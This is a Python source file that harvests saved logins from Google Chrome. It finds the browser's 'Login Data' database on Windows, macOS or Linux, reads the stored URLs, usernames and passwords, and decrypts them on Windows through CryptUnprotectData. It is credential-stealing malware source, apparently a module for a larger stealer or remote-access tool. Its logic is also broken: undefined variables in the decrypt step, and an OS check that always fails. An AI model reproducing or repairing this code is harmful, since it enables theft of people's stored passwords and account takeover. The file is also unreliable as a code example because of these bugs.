import sqlite3
import sys
import os
import time
try:
    import win32crypt
except:
    pass


class GooglePwd:
	def get_path(self, os_name, platform):
		if os_name=="nt":
			self.path = os.getenv("localappdata") + "\\Google\\Chrome\\User Data\\Default\\"
		elif os_name == "posix":
			self.path = os.getenv("HOME")
			if platform == "darwin":
				self.path += '/Library/Application Support/Google/Chrome/Default/'
			else:
				self.path += '/.config/google-chrome/Default/'
		if not os.path.isdir(self.path):
			self.path = ""


	def is_OSX(self, os_name, platform):
		if os_name == "posix" and platform == "darwin": return None   


	def fetch_values_from_db(self):
		connection = sqlite3.connect(self.path+"Login Data")
		with connection:
			cursor = connection.cursor()
			sql_query = cursor.execute(
				"SELECT action_url, username_value, password_value FROM logins"
			)
			self.values = sql_query.fetchall()


	def decrypt(self):
		for src_url, usrname, pwd in self.values:
			if os_name == "nt":
				pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1]
			if pwd:
				result += f'Url: {src_url}\nUsername: {usrname}\npwd: {str(pwd)}\n'
		return result


	def harvest(self):
		os_name = os.name
		platform = sys.platform
		path = self.get_path(os_name, platform)

		if not self.path:
			return 'Database not found'

		if not self.is_OSX(os_name, platform):
			return "Mac OSX not supported...yet"
		try:
			values = self.fetch_values_from_db()
			result = self.decrypt()
		except sqlite3.OperationalError as ex:
			ex = str(ex)
			if ex == "database is locked":
				result = "[!!] Make sure google chrome is not running in the background"
			elif ex == "no such table: logins":
				result = "[!!] Something went wrong with the database name"
			elif ex == "unable to open database file":
				result = "[!!] Something wrong with the database path"
		return result

   
   
    
def run():
	google_pwd = GooglePwd()
	result = google_pwd.harvest()
	return result

            
            
    
